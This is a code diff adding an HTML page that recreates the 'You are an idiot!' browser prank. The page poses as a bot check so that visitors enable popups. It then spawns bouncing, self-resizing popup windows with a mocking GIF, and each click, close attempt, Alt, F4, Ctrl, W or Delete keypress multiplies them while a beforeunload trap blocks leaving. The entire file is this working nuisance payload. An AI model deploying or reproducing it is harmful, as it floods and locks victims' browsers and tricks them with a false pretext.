@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="windows-1252">
+<title>Idiot!</title>
+<style>
+html, body {
+    margin:0; padding:0; width:100%; height:100%; overflow:hidden;
+    background:#fff; display:flex; justify-content:center; align-items:center;
+    font-family:sans-serif; text-align:center;
+}
+#statusText { font-size:1.5em; }
+#mainGif { width:100%; height:100%; object-fit:cover; display:none; }
+</style>
+<script>
+var xOff=5, yOff=5, xPos=400, yPos=-100, flagRun=1;
+
+// -------------------- Popup Test --------------------
+function testPopups(callback) {
+    const testCount = 5;
+    let testPopups = [];
+    let blocked = false;
+
+    for (let i = 0; i < testCount; i++) {
+        let p = window.open("", "_blank", "width=1,height=1,left=1,top=1,toolbar=no,scrollbars=no,menubar=no,location=no,resizable=no");
+        if (!p) {
+            blocked = true;
+            break;
+        } else {
+            testPopups.push(p);
+            try { p.document.title = "Scanning..."; p.resizeTo(1,1); } catch(e){}
+            // force resize on every attempt
+            p.addEventListener('resize', ()=> { try{ p.resizeTo(1,1); p.document.title="Scanning..."; } catch(e){} });
+        }
+    }
+
+    setTimeout(() => {
+        testPopups.forEach(p => { if (!p.closed) p.close(); });
+        callback(!blocked && testPopups.length === testCount);
+    }, 300);
+}
+
+// -------------------- Open a prank popup --------------------
+function openPopup() {
+    const popupWidth = 357, popupHeight = 330;
+    let x = Math.random()*(screen.width-popupWidth);
+    let y = Math.random()*(screen.height-popupHeight);
+
+    let popup = window.open("", "_blank", `width=${popupWidth},height=${popupHeight},left=${x},top=${y},toolbar=no,scrollbars=no,menubar=no,location=no,resizable=no`);
+    if(!popup) return;
+
+    popup.document.write(`
+    <!DOCTYPE html>
+    <html lang="en">
+    <head>
+        <meta charset="windows-1252">
+        <title>You are an idiot!</title>
+        <style>
+            html,body{margin:0;padding:0;width:100%;height:100%;overflow:hidden;}
+            img{width:100%;height:100%;object-fit:cover;}
+        </style>
+        <script>
+            const popupWidth=${popupWidth}, popupHeight=${popupHeight};
+            function enforceSize(){ try{ window.resizeTo(popupWidth,popupHeight); }catch(e){} }
+            window.addEventListener('resize', enforceSize);
+            window.addEventListener('load', enforceSize);
+            enforceSize();
+
+            document.addEventListener('click', ()=>{ window.opener.spawnPopups(6); });
+
+            let xOff=5,yOff=5,xPos=400,yPos=-100,flagRun=1;
+            function newXlt(){ xOff=-Math.ceil(6*Math.random())*5-10; window.focus(); }
+            function newXrt(){ xOff=Math.ceil(7*Math.random())*5-10; }
+            function newYup(){ yOff=-Math.ceil(6*Math.random())*5-10; }
+            function newYdn(){ yOff=Math.ceil(7*Math.random())*5-10; }
+
+            function playBall(){ 
+                xPos+=xOff;yPos+=yOff;
+                if(xPos>screen.width-popupWidth)newXlt();
+                if(xPos<0)newXrt();
+                if(yPos>screen.height-popupHeight)newYup();
+                if(yPos<0)newYdn();
+                if(flagRun==1){ window.moveTo(xPos,yPos); setTimeout(playBall,1); }
+            }
+
+            window.onbeforeunload = ()=>{ window.opener.spawnPopups(6); return null; };
+            window.onload=()=>{ flagRun=1; playBall(); };
+        <\/script>
+    </head>
+    <body>
+        <img src="https://storage.gra.cloud.ovh.net/v1/AUTH_728ab22ba0c842468a897907be9a7075/flipanim/anim/adwpb21q.gif" alt="You are an idiot!">
+    </body>
+    </html>
+    `);
+    popup.document.close();
+
+    function bounce(){
+        if(!popup || popup.closed) return;
+        x+=xOff;y+=yOff;
+        if(x<=0||x+popupWidth>=screen.width)xOff=-xOff;
+        if(y<=0||y+popupHeight>=screen.height)yOff=-yOff;
+        try{ popup.moveTo(x,y); popup.resizeTo(popupWidth,popupHeight); }catch(e){}
+        setTimeout(bounce,20);
+    }
+    bounce();
+}
+
+// -------------------- Spawn multiple prank popups --------------------
+function spawnPopups(n){ for(let i=0;i<n;i++) openPopup(); }
+
+// -------------------- Main window bounce --------------------
+function playBall(){ 
+    xPos+=xOff;yPos+=yOff;
+    if(xPos>screen.width-357)newXlt();
+    if(xPos<0)newXrt();
+    if(yPos>screen.height-330)newYup();
+    if(yPos<0)newYdn();
+    if(flagRun==1){ window.moveTo(xPos,yPos); setTimeout(playBall,1); }
+}
+function newXlt(){ xOff=-Math.ceil(6*Math.random())*5-10; window.focus(); }
+function newXrt(){ xOff=Math.ceil(7*Math.random())*5-10; }
+function newYup(){ yOff=-Math.ceil(6*Math.random())*5-10; }
+function newYdn(){ yOff=Math.ceil(7*Math.random())*5-10; }
+
+function altf4key(e){ if(e.keyCode==18||e.keyCode==115){ alert("You are an idiot!"); spawnPopups(6); } }
+function ctrlwkey(e){ if(e.keyCode==17||e.keyCode==87){ alert("You are an idiot!"); spawnPopups(6); } }
+function delkey(e){ if(e.keyCode==46){ alert("You are an idiot!"); spawnPopups(6); } }
+
+// -------------------- Initialize --------------------
+window.onload = function(){
+    const status = document.getElementById("statusText");
+
+    // test popups first
+    testPopups((allowed)=>{
+        if(!allowed){
+            status.innerText="Hmm, please turn on popups if you are not a bot.";
+        } else {
+            // hide status and show main GIF
+            status.style.display="none";
+            const gif = document.createElement("img");
+            gif.id="mainGif";
+            gif.src="https://storage.gra.cloud.ovh.net/v1/AUTH_728ab22ba0c842468a897907be9a7075/flipanim/anim/adwpb21q.gif";
+            gif.alt="You are an idiot!";
+            document.body.appendChild(gif);
+
+            // start prank
+            flagRun=1; playBall();
+            spawnPopups(6); // spawn original 6 popups
+        }
+    });
+};
+
+// -------------------- Confirm before leaving --------------------
+window.addEventListener('beforeunload', function(e){
+    e.preventDefault();
+    e.returnValue = "Are you an idiot?";
+    spawnPopups(6);
+});
+</script>
+</head>
+<body onkeydown="altf4key(event);ctrlwkey(event);delkey(event);">
+<div id="statusText">Please wait for us to see if you are a bot...</div>
+</body>
+</html>
